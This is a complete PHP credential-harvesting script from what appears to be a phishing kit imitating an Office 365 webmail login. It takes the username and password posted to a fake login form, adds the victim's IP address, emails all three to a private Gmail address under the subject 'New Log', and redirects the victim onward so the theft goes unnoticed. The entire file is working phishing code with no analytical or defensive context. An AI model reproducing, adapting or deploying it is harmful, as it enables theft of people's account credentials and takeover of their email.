<?php
$ip = getenv("REMOTE_ADDR");
$login = $_POST['uname'];
$passwd = $_POST['pword'];
$own = 'myprivateworkbox@gmail.com';
$domain = 'O365 2020';
$sender = 'admin';
$subj = "New Log From $ip | $login";
$headers .= "From: SM WEBMAIL 2020<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'verified.php';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>Email: $login</tr>
 <tr><td>Password: $passwd</td></tr>
 <tr><td>IP: $ip</a> </td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header( "Location: index.php?email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: auth.php?email=$login");
}

?>